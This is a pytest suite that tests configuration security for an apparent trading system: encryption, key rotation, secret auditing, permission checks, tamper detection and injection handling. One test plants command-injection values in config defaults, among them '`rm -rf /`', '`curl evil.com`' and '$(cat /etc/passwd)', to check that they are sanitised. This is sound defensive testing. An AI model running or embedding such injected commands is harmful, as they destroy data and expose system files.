"""
Phase 7.3: Configuration Security Tests
Following TDD methodology - these tests validate configuration security
"""

import pytest
import os
import yaml
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, mock_open
from cryptography.fernet import Fernet
import base64
import secrets

from src.utils.security.config_encryption import ConfigEncryption
from src.utils.security.config_auditor import ConfigAuditor
from src.utils.security.immutable_config import ImmutableConfig
from src.utils.config import ConfigManager, get_config


class TestConfigurationEncryption:
    """Test configuration encryption security following TDD methodology"""
    
    @pytest.fixture
    def encryption_key(self):
        """Generate test encryption key"""
        return Fernet.generate_key()
    
    @pytest.fixture
    def config_encryption(self, encryption_key):
        """Create ConfigEncryption instance for testing"""
        return ConfigEncryption(encryption_key)

    def test_sensitive_configuration_encryption_should_protect_secrets(self, config_encryption):
        """Test that sensitive configuration is properly encrypted - TDD FAIL FIRST"""
        # Test configuration with sensitive data
        sensitive_config = {
            "database": {
                "password": "super_secret_password_123",
                "connection_string": "postgresql://user:secret@localhost/db"
            },
            "api_keys": {
                "trading_api": "secret_trading_key_456",
                "market_data": "secret_market_key_789"
            },
            "security": {
                "jwt_secret": "jwt_secret_key_abc",
                "encryption_key": "encryption_key_def"
            }
        }
        
        # Encrypt configuration
        encrypted_config = config_encryption.encrypt_config(sensitive_config)
        
        # Encrypted config should not contain plain text secrets
        encrypted_str = json.dumps(encrypted_config)
        assert "super_secret_password_123" not in encrypted_str, "Password should be encrypted"
        assert "secret_trading_key_456" not in encrypted_str, "API key should be encrypted"
        assert "jwt_secret_key_abc" not in encrypted_str, "JWT secret should be encrypted"
        
        # Should be able to decrypt back to original
        decrypted_config = config_encryption.decrypt_config(encrypted_config)
        assert decrypted_config == sensitive_config, "Decryption should restore original config"

    def test_encryption_key_rotation_should_update_all_encrypted_data(self, config_encryption):
        """Test encryption key rotation updates all encrypted data - TDD FAIL FIRST"""
        original_config = {
            "secret_data": "sensitive_information",
            "public_data": "not_sensitive"
        }
        
        # Encrypt with original key
        encrypted_config = config_encryption.encrypt_config(original_config)
        
        # Rotate to new key
        new_key = Fernet.generate_key()
        rotated_config = config_encryption.rotate_encryption_key(encrypted_config, new_key)
        
        # Create new encryption instance with new key
        new_encryption = ConfigEncryption(new_key)
        
        # Should be able to decrypt with new key
        decrypted_config = new_encryption.decrypt_config(rotated_config)
        assert decrypted_config == original_config, "Key rotation should maintain data integrity"
        
        # Old key should not work
        with pytest.raises(Exception):
            config_encryption.decrypt_config(rotated_config)

    def test_malformed_encrypted_config_should_fail_securely(self, config_encryption):
        """Test that malformed encrypted config fails securely - TDD FAIL FIRST"""
        # Test with various malformed encrypted configs
        malformed_configs = [
            {"encrypted_field": "not_base64_!@#$"},
            {"encrypted_field": ""},
            {"encrypted_field": "invalid_fernet_token"},
            {"encrypted_field": base64.b64encode(b"invalid_data").decode()},
            {"encrypted_field": None}
        ]
        
        for malformed_config in malformed_configs:
            with pytest.raises((ValueError, TypeError, Exception)):
                config_encryption.decrypt_config(malformed_config)

    def test_encryption_of_nested_configuration_structures(self, config_encryption):
        """Test encryption of deeply nested configuration - TDD FAIL FIRST"""
        nested_config = {
            "level1": {
                "level2": {
                    "level3": {
                        "secret": "deeply_nested_secret",
                        "public": "public_data"
                    }
                }
            },
            "array_config": [
                {"secret": "array_secret_1"},
                {"secret": "array_secret_2"}
            ]
        }
        
        # Mark which fields should be encrypted
        encryption_paths = [
            "level1.level2.level3.secret",
            "array_config[].secret"
        ]
        
        encrypted_config = config_encryption.encrypt_config(nested_config, encryption_paths)
        
        # Verify encryption
        encrypted_str = json.dumps(encrypted_config)
        assert "deeply_nested_secret" not in encrypted_str, "Nested secret should be encrypted"
        assert "array_secret_1" not in encrypted_str, "Array secret should be encrypted"
        assert "public_data" in encrypted_str, "Public data should remain unencrypted"
        
        # Verify decryption
        decrypted_config = config_encryption.decrypt_config(encrypted_config, encryption_paths)
        assert decrypted_config == nested_config, "Complex nested structure should decrypt correctly"


class TestConfigurationAuditing:
    """Test configuration auditing and security validation"""
    
    @pytest.fixture
    def config_auditor(self):
        """Create ConfigAuditor instance for testing"""
        return ConfigAuditor()

    def test_hardcoded_secrets_detection_should_fail_with_secrets(self, config_auditor):
        """Test detection of hardcoded secrets in configuration - TDD FAIL FIRST"""
        # Configuration with hardcoded secrets (should fail)
        config_with_secrets = {
            "database": {
                "password": "admin123",  # Hardcoded password
                "host": "localhost"
            },
            "api_keys": {
                "trading": "sk-1234567890abcdef",  # Hardcoded API key
                "analytics": "secret-key-12345"
            },
            "security": {
                "jwt_secret": "dev-secret-change-in-production",  # Default secret
                "encryption_key": "test-key-123"
            }
        }
        
        # Audit should detect secrets
        audit_result = config_auditor.audit_for_secrets(config_with_secrets)
        
        assert not audit_result.is_secure, "Config with hardcoded secrets should fail audit"
        assert len(audit_result.violations) > 0, "Should detect secret violations"
        assert any("password" in v.field_path.lower() for v in audit_result.violations), \
            "Should detect hardcoded password"
        assert any("secret" in v.field_path.lower() for v in audit_result.violations), \
            "Should detect hardcoded secrets"

    def test_environment_variable_usage_validation(self, config_auditor):
        """Test validation of proper environment variable usage - TDD FAIL FIRST"""
        # Configuration using environment variables (should pass)
        secure_config = {
            "database": {
                "password": "${DATABASE_PASSWORD}",
                "host": "${DATABASE_HOST:localhost}"  # With default
            },
            "api_keys": {
                "trading": "${TRADING_API_KEY}",
                "analytics": "${ANALYTICS_API_KEY}"
            },
            "security": {
                "secret_key": "${SECRET_KEY}",
                "encryption_key": "${ENCRYPTION_KEY}"
            }
        }
        
        # Audit should pass for environment variables
        audit_result = config_auditor.audit_for_secrets(secure_config)
        
        assert audit_result.is_secure, "Config using environment variables should pass audit"
        assert len(audit_result.violations) == 0, "Should not detect violations for env vars"

    def test_production_environment_security_validation_should_be_strict(self, config_auditor):
        """Test production environment has stricter security validation - TDD FAIL FIRST"""
        # Configuration that might be acceptable in dev but not production
        dev_acceptable_config = {
            "app": {"environment": "production"},
            "database": {
                "password": "${DATABASE_PASSWORD:admin123}",  # Has fallback
                "host": "localhost"  # Localhost in production
            },
            "security": {
                "secret_key": "${SECRET_KEY:dev-secret}",  # Has dev fallback
                "debug": True  # Debug enabled
            }
        }
        
        # Production audit should be stricter
        audit_result = config_auditor.audit_production_security(dev_acceptable_config)
        
        assert not audit_result.is_secure, "Production config should reject dev fallbacks"
        assert any("fallback" in v.violation_type.lower() for v in audit_result.violations), \
            "Should detect environment variable fallbacks in production"
        assert any("debug" in v.field_path.lower() for v in audit_result.violations), \
            "Should detect debug mode in production"

    def test_configuration_permission_validation(self, config_auditor):
        """Test configuration file permission validation - TDD FAIL FIRST"""
        # Create temporary config file with wrong permissions
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.yaml') as f:
            yaml.dump({"test": "config"}, f)
            config_path = f.name
        
        try:
            # Set overly permissive permissions (readable by others)
            os.chmod(config_path, 0o644)  # World readable
            
            # Audit should detect insecure permissions
            audit_result = config_auditor.audit_file_permissions(config_path)
            
            assert not audit_result.is_secure, "Config file with world-readable permissions should fail audit"
            assert any("permission" in v.violation_type.lower() for v in audit_result.violations), \
                "Should detect insecure file permissions"
        finally:
            os.unlink(config_path)

    def test_configuration_change_detection(self, config_auditor):
        """Test detection of unauthorized configuration changes - TDD FAIL FIRST"""
        original_config = {
            "database": {"host": "localhost", "port": 5432},
            "security": {"jwt_expiry": 3600}
        }
        
        # Simulate unauthorized changes
        modified_config = {
            "database": {"host": "malicious-host.com", "port": 5432},  # Host changed
            "security": {"jwt_expiry": 86400},  # Expiry extended
            "backdoor": {"enabled": True}  # New backdoor config added
        }
        
        # Generate checksums for original config
        original_checksum = config_auditor.generate_config_checksum(original_config)
        
        # Detect changes
        change_result = config_auditor.detect_config_changes(
            original_config, modified_config, original_checksum
        )
        
        assert change_result.has_changes, "Should detect configuration changes"
        assert "database.host" in change_result.changed_fields, "Should detect host change"
        assert "backdoor" in change_result.new_fields, "Should detect new backdoor field"


class TestImmutableConfiguration:
    """Test immutable configuration security"""
    
    @pytest.fixture
    def immutable_config(self):
        """Create ImmutableConfig instance for testing"""
        test_config = {
            "database": {"host": "localhost", "port": 5432},
            "security": {"jwt_expiry": 3600, "max_attempts": 3}
        }
        return ImmutableConfig(test_config)

    def test_configuration_modification_attempts_should_fail(self, immutable_config):
        """Test that configuration modification attempts fail - TDD FAIL FIRST"""
        # Attempt to modify configuration should fail
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            immutable_config.database.host = "malicious-host.com"
        
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            immutable_config.security.jwt_expiry = 86400
        
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            immutable_config.backdoor = {"enabled": True}

    def test_configuration_deletion_attempts_should_fail(self, immutable_config):
        """Test that configuration deletion attempts fail - TDD FAIL FIRST"""
        # Attempt to delete configuration should fail
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            del immutable_config.database.host
        
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            del immutable_config.security
        
        with pytest.raises((AttributeError, TypeError, RuntimeError)):
            delattr(immutable_config, 'database')

    def test_configuration_deep_copy_protection(self, immutable_config):
        """Test that deep copy doesn't allow modification - TDD FAIL FIRST"""
        import copy
        
        # Even with deep copy, original should remain immutable
        config_copy = copy.deepcopy(immutable_config)
        
        # Modifying copy should not affect original
        original_host = immutable_config.database.host
        
        # This should not affect the original immutable config
        if hasattr(config_copy, '_data'):
            config_copy._data['database']['host'] = "modified-host"
        
        # Original should remain unchanged
        assert immutable_config.database.host == original_host, \
            "Immutable config should not be affected by copy modifications"

    def test_configuration_serialization_security(self, immutable_config):
        """Test configuration serialization doesn't expose internals - TDD FAIL FIRST"""
        # Serialization should not expose internal mutable structures
        serialized = immutable_config.to_dict()
        
        # Modifying serialized dict should not affect original
        original_port = immutable_config.database.port
        serialized['database']['port'] = 9999
        
        # Original should remain unchanged
        assert immutable_config.database.port == original_port, \
            "Serialization should not expose mutable references"


class TestConfigurationValidation:
    """Test comprehensive configuration validation"""
    
    def test_configuration_schema_validation_should_reject_invalid_structure(self):
        """Test configuration schema validation rejects invalid structure - TDD FAIL FIRST"""
        # Invalid configuration structures
        invalid_configs = [
            # Missing required sections
            {"app": {"name": "test"}},  # Missing database, security
            
            # Invalid data types
            {
                "app": {"name": "test", "debug": "not_boolean"},
                "database": {"port": "not_integer"},
                "security": {"jwt_expiry": "not_number"}
            },
            
            # Invalid value ranges
            {
                "app": {"name": "test"},
                "database": {"port": -1},  # Invalid port
                "security": {"jwt_expiry": -3600}  # Negative expiry
            }
        ]
        
        for invalid_config in invalid_configs:
            with pytest.raises((ValueError, TypeError, Exception)):
                # This should fail if proper validation is implemented
                config_manager = ConfigManager()
                
                with patch('src.utils.config.yaml.safe_load', return_value=invalid_config), \
                     patch('pathlib.Path.exists', return_value=True), \
                     patch('builtins.open'):
                    
                    config_manager.load_and_validate(invalid_config)

    def test_security_configuration_requirements_in_production(self):
        """Test security configuration requirements in production - TDD FAIL FIRST"""
        # Production config missing security requirements
        insecure_production_config = {
            "app": {"name": "trading_system", "environment": "production"},
            "database": {"host": "localhost", "port": 5432},
            # Missing security section entirely
        }
        
        with pytest.raises((ValueError, Exception)) as exc_info:
            config_manager = ConfigManager()
            
            with patch('src.utils.config.yaml.safe_load', return_value=insecure_production_config), \
                 patch('pathlib.Path.exists', return_value=True), \
                 patch('builtins.open'):
                
                config = config_manager.load()
                
                # Manual validation if automatic validation doesn't catch it
                if hasattr(config, 'app') and config.app.environment == 'production':
                    if not hasattr(config, 'security'):
                        raise ValueError("Security configuration required in production")

    def test_environment_variable_substitution_security(self):
        """Test environment variable substitution security - TDD FAIL FIRST"""
        # Configuration with potential injection attacks
        malicious_config = {
            "app": {"name": "test"},
            "database": {
                "host": "${DB_HOST:`rm -rf /`}",  # Command injection attempt
                "password": "${DB_PASS:`curl evil.com`}"  # Command injection
            },
            "security": {
                "secret_key": "${SECRET_KEY:$(cat /etc/passwd)}"  # File access attempt
            }
        }
        
        # Environment variable substitution should sanitize inputs
        with patch.dict(os.environ, {}, clear=True):  # No env vars set
            with patch('src.utils.config.yaml.safe_load', return_value=malicious_config), \
                 patch('pathlib.Path.exists', return_value=True), \
                 patch('builtins.open'):
                
                config_manager = ConfigManager()
                
                # Should either reject the config or safely handle substitution
                try:
                    config = config_manager.load()
                    
                    # If config loads, verify no command injection occurred
                    if hasattr(config, 'database'):
                        assert "`rm -rf /`" not in str(config.database.host), \
                            "Command injection should be prevented"
                        assert "`curl evil.com`" not in str(config.database.password), \
                            "Command injection should be prevented"
                
                except (ValueError, Exception):
                    # It's also acceptable to reject malicious config entirely
                    pass

    def test_configuration_memory_security(self):
        """Test configuration doesn't leak sensitive data in memory - TDD FAIL FIRST"""
        import gc
        
        # Create config with sensitive data
        sensitive_config = {
            "database": {"password": "super_secret_password_12345"},
            "api_keys": {"trading": "secret_api_key_67890"}
        }
        
        with patch('src.utils.config.yaml.safe_load', return_value=sensitive_config), \
             patch('pathlib.Path.exists', return_value=True), \
             patch('builtins.open'):
            
            config_manager = ConfigManager()
            config = config_manager.load()
            
            # Delete config reference
            del config
            del config_manager
            
            # Force garbage collection
            gc.collect()
            
            # Check if sensitive data is still in memory (this is a basic check)
            # In practice, you'd use more sophisticated memory scanning
            memory_objects = gc.get_objects()
            
            # Count how many times sensitive data appears in memory
            password_count = sum(1 for obj in memory_objects 
                               if isinstance(obj, str) and "super_secret_password_12345" in obj)
            
            # Should minimize sensitive data in memory
            # Note: This test may need adjustment based on actual implementation
            assert password_count <= 1, "Sensitive config data should not persist in memory"